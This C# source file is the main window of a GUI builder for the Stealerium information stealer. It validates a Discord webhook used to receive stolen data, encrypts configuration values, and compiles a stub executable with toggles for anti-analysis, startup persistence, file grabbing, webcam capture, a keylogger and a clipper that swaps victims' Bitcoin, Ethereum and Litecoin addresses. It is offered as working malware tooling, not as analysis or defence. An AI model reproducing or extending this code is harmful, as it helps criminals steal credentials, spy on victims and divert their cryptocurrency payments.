using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;

namespace BuilderGUI
{
    public partial class MainWindow : Window
    {
        private string stubPath;
        private bool isStubDetected = false;
        private bool isWebhookValid = false;

        public MainWindow()
        {
            InitializeComponent();
            CheckStubFile();
        }

        private void CheckStubFile()
        {
            // Assume stub.exe is in the "Stub" folder relative to the application's directory
            stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "stub.exe");

            if (File.Exists(stubPath))
            {
                StubStatusLabel.Text = $"Stub detected at: {stubPath}";
                StubStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
                isStubDetected = true;
            }
            else
            {
                StubStatusLabel.Text = "stub.exe not found! Please place it in the 'Stub' folder.";
                StubStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
                isStubDetected = false;
            }

            UpdateBuildButtonState();
        }

        private void UpdateBuildButtonState()
        {
            BuildButton.IsEnabled = isStubDetected && isWebhookValid;
        }

        private async void TestWebhookButton_Click(object sender, RoutedEventArgs e)
        {
            var token = WebhookUrlTextBox.Text.Trim();
            if (string.IsNullOrEmpty(token))
            {
                MessageBox.Show("Discord webhook URL cannot be empty.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            TestWebhookButton.IsEnabled = false;
            WebhookStatusLabel.Text = "Testing webhook...";
            WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Black;

            isWebhookValid = await Discord.WebhookIsValidAsync(token);

            if (!isWebhookValid)
            {
                WebhookStatusLabel.Text = "Invalid webhook URL!";
                WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
            }
            else
            {
                bool messageSent = await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
                if (messageSent)
                {
                    WebhookStatusLabel.Text = "Connected successfully!";
                    WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
                }
                else
                {
                    WebhookStatusLabel.Text = "Failed to send test message.";
                    WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
                    isWebhookValid = false; // Consider webhook invalid if message fails
                }
            }

            UpdateBuildButtonState();

            TestWebhookButton.IsEnabled = true;
        }

        private void WebhookUrlTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            // Since the webhook URL has changed, we need to re-validate it.
            isWebhookValid = false;
            UpdateBuildButtonState();
            WebhookStatusLabel.Text = "";
        }

        private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            StartupOptionsPanel.Visibility = Visibility.Visible;
        }

        private void StartupCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            StartupOptionsPanel.Visibility = Visibility.Collapsed;
        }

        private void ClipperCheckBox_Checked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Visible;
        }

        private void ClipperCheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            ClipperAddressesPanel.Visibility = Visibility.Collapsed;
        }

        private void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            BuildStub();
        }

        private void BuildStub()
        {
            // Collect and validate inputs
            var token = WebhookUrlTextBox.Text.Trim();
            if (string.IsNullOrEmpty(token))
            {
                MessageBox.Show("Discord webhook URL cannot be empty.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            // Set configuration values
            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
            Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Startup"] = StartupCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["StartDelay"] = StartDelayCheckBox.IsChecked == true ? "1" : "0";
            Build.ConfigValues["Grabber"] = GrabberCheckBox.IsChecked == true ? "1" : "0";

            if (Build.ConfigValues["Startup"] == "1")
            {
                Build.ConfigValues["WebcamScreenshot"] = WebcamScreenshotCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Keylogger"] = KeyloggerCheckBox.IsChecked == true ? "1" : "0";
                Build.ConfigValues["Clipper"] = ClipperCheckBox.IsChecked == true ? "1" : "0";
            }
            else
            {
                Build.ConfigValues["WebcamScreenshot"] = "0";
                Build.ConfigValues["Keylogger"] = "0";
                Build.ConfigValues["Clipper"] = "0";
            }

            if (Build.ConfigValues["Clipper"] == "1")
            {
                Build.ConfigValues["ClipperBTC"] = Crypt.EncryptConfig(ClipperBTCTextBox.Text.Trim());
                Build.ConfigValues["ClipperETH"] = Crypt.EncryptConfig(ClipperETHTextBox.Text.Trim());
                Build.ConfigValues["ClipperLTC"] = Crypt.EncryptConfig(ClipperLTCTextBox.Text.Trim());
            }
            else
            {
                Build.ConfigValues["ClipperBTC"] = "";
                Build.ConfigValues["ClipperETH"] = "";
                Build.ConfigValues["ClipperLTC"] = "";
            }

            // Prompt the user to select the output file location
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Title = "Save Built Stub",
                Filter = "Executable Files (*.exe)|*.exe",
                FileName = "build.exe"
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                try
                {
                    var buildPath = Build.BuildStub(saveFileDialog.FileName, stubPath);
                    BuildStatusLabel.Text = $"Stub built successfully: {buildPath}";
                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
                }
                catch (Exception ex)
                {
                    BuildStatusLabel.Text = $"Build failed: {ex.Message}";
                    BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
                }
            }
            else
            {
                BuildStatusLabel.Text = "Build cancelled by user.";
                BuildStatusLabel.Foreground = System.Windows.Media.Brushes.Gray;
            }
        }
    }
}
